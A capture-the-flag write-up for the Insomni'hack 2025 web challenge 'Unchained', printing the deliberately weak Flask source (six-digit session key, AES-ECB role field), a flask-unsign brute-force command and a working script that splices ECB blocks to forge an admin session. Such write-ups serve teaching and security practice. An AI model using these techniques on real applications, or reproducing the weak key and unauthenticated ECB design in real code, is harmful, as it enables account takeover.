---
title: "Unchained - Insomni'hack 2025"
category: "web"
subcategory: "aes"
type: "writeup"
tags: ["web", "flask", "python", "aes-ecb", "flask-session", "aes", "ecb", "jwt", "base64", "wordlists", "insomni-hack", "insomni-hack-2025", "2025", "ctf-writeup"]
summary: "webinsomnihack2025aescryptoflask"
source:
  name: "CTFtime writeup #40164"
  url: "https://ctftime.org/writeup/40164"
original_source: "https://www.norelect.ch/writeups/insomnihack2025/unchained/"
ctf:
  name: "Insomni'hack 2025"
  year: 2025
  challenge: "Unchained"
---

## Metadata

- **CTF:** Insomni'hack 2025
- **Task:** Unchained
- **Author team:** /mnt/ain
- **CTFtime tags:** flask, python, aes-ecb, flask-session, aes
- **CTFtime:** <https://ctftime.org/writeup/40164>
- **Original writeup:** <https://www.norelect.ch/writeups/insomnihack2025/unchained/>

---
# Unchained

[web](https://www.norelect.ch/tags/web)[insomnihack2025](https://www.norelect.ch/tags/insomnihack2025)[aes](https://www.norelect.ch/tags/aes)[crypto](https://www.norelect.ch/tags/crypto)[flask](https://www.norelect.ch/tags/flask)

## Discovery

An initial look at the application tells us that we have a flask application with the following source code:

```
    from base64 import b64encode, b64decode
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from random import randint
    import uuid
    import os
    from flask import Flask, request, session, redirect, url_for
    import re
    from waitress import serve
    
    app = Flask(__name__)
    app.secret_key = ''.join(["{}".format(randint(0, 9)) for num in range(0, 6)])
    
    MAIN_KEY = b"FAKE_KEY"
    
    def gen_userid():
        return str(uuid.uuid4())
    
    def encrypt(data,MAIN_KEY):
        cipher = AES.new(MAIN_KEY, AES.MODE_ECB)
        cipher_text_bytes = cipher.encrypt(pad(data, 16,'pkcs7'))
        cipher_text_b64 = b64encode(cipher_text_bytes)
        cipher_text = cipher_text_b64.decode('ascii')
        return cipher_text
    
    def decrypt(MAIN_KEY, cipher_text):
        rem0ve_b64 = b64decode(cipher_text)
        cipher = AES.new(MAIN_KEY, AES.MODE_ECB)
        decrypted_bytes = cipher.decrypt(rem0ve_b64)
        decrypted_data = unpad(decrypted_bytes, 16, 'pkcs7').decode('ascii')
        return decrypted_data
    
    @app.route("/")
    def welcome():
        return '''
        <div style="text-align: center;">
            <h1 style="font-size: 3em; color: #333;">UNDER CONSTRUCTION</h1>
            <img src="/static/img/page-under-construction.jpg" alt="Under Construction" style="width:400px; display: block; margin: 0 auto;">
    
        </div>
        <!-- HACKERS HAVE NO CHANCE THIS TIME!!! -->
        '''
    
    
    @app.route("/status")
    def status():
        if 'status' in session:
            plain_text = decrypt(MAIN_KEY, session["status"])
            return f'Logged in as {plain_text}'
        return 'You are not logged in'
    
    @app.route("/secret")
    def get_secret():
        plain_text = decrypt(MAIN_KEY, session["status"])
        role = plain_text.split("::")[2]
        if role == 'admin':
            return  os.environ['INS']
        return f'You are a just a {role}. Only admins can see the secret!'
    
    @app.route('/login', methods=['GET', 'POST'])
    def login():
        if request.method == 'POST':
            user_id = gen_userid()
    
            user = re.sub(r'\W+', '', request.form['username'])
    
            status_data = user_id + \
            "::" + user + \
            "::" + "guest"
    
            cipher_text = encrypt(data=status_data.encode('ascii'),MAIN_KEY=MAIN_KEY)
            session['status'] = cipher_text
    
            return redirect(url_for('status'))
        return '''
                <form method="post">
                    <p>
                        <label for="username">Username:</label>
                        <input type="text" id="username" name="username">
                    </p>
                    <p>
                        <input type="submit" value="Login">
                    </p>
    
                    <p> * Note to myself: Password field TBD </p>
                </form>
        '''
    
    @app.route('/logout')
    def logout():
        session.pop('status', None)
        return redirect(url_for('status'))
    
    if __name__=="__main__":
        serve(app, host='0.0.0.0', port=80)
```

## Bruteforcing the flask secret key

My team member, [xtea418](http://te4.uk/) figured out that the `flask` session key is set to a random 6-digit number in the source code, so it can be bruteforced:

```
    pip3 install flask-unsign[wordlist]
    
    echo {0..9}{0..9}{0..9}{0..9}{0..9}{0..9} | tr ' ' '\n' > wordlist.txt
    
    flask-unsign --unsign --cookie 'eyJzdGF0dXMiOiJhd25TaXU1WGltSDhCSkNpNFV3Zkg4L0hkd3BNL3hsYWhQOGpNc2RvMkE4bWFQNG5PalNXVFBrRlZacGgzay9tNGk2OEYzUm9aOUJkdGJ0cDZSNXdxQT09In0.aAI0-Q.saoIJ67WgELLIzQeFQmA-ltG79U' -w wordlist.txt --no-literal-eval
```

Success!

```
    [*] Session decodes to: {'status': 'awnSiu5XimH8BJCi4UwfH8/HdwpM/xlahP8jMsdo2A8maP4nOjSWTPkFVZph3k/m4i68F3RoZ9Bdtbtp6R5wqA=='}
    [*] Starting brute-forcer with 8 threads..
    [+] Found secret key after 256384 attempts
    b'256321'
```

We now know the flask secret key and can therefore create and sign arbitrary flask sessions. However, the `status` field inside the session is still encrypted with `AES-ECB` using a different key that we do not know.

## Understanding the data in the AES blocks

Since encrypted blocks in `AES` are 16 bytes in length, we can figure out where the data from the session `status` field lands exactly within these blocks:

![Visualization of data alignment in AES blocks](https://www.norelect.ch/writeups/insomnihack2025/unchained/unchained.svg)

Since `AES-ECB` mode encrypts data into single independent blocks, we can re-order the blocks in any way we want. Since there is also no integrity checking, the re-ordered data will be decrypted without a problem. This allows us to craft a session with a `status` field that places the field delimiter `::` right before a block border (Block `A3` to `A4`). After creating another encrypted `status` field for another user with a username that ends with `admin` aligned to start perfectly at the beginning of block `B4`, we can then re-assemble the blocks from the two previous encrypted `status` fields in a way that allows us to construct an encrypted chain of blocks that decrypts to: `4e461eba-1c43-11f0-b101-ab80c20c0721::aaaaaaaa::admin::guest`.

This will allow us to create a status block for a user that will have the `admin` role.

> Note: The UUID of the newly created `status` data is different than the two previously created users since parts the combined. This has no impact on this application since it doesn’t use the UUID for anything or check if a user with this UUID exists.

## Putting it all together

Finally, its time to create a solve script which will solve the challenge for us:

```
    import requests, base64
    from flask_unsign import sign, decode
    
    def generate_raw_status(username):
        s = requests.Session()
        s.post("https://unchained.insomnihack.ch/login", data={"username": username})
        status = decode(s.cookies["session"])["status"]
        status_raw = base64.b64decode(status)
        return bytearray(status_raw)
    
    cutoff_block = generate_raw_status("aaaaaaaa")
    admin_block = generate_raw_status("bbbbbbbbbbadmin")
    
    admin_block[32:48] = cutoff_block[32:48]
    
    reassembled_status = base64.b64encode(admin_block).decode("utf-8")
    
    SECRET_KEY = b'256321'
    reassembled_jwt = sign({"status": reassembled_status}, SECRET_KEY)
    
    r = requests.get("https://unchained.insomnihack.ch/secret", cookies={
        "session": reassembled_jwt
    })
    print(r.text)
```

Running the solve script will now get us the flag!

```
    INS{#Com3_Br34k_th3_Cha1n_Aga1N!!!}
```
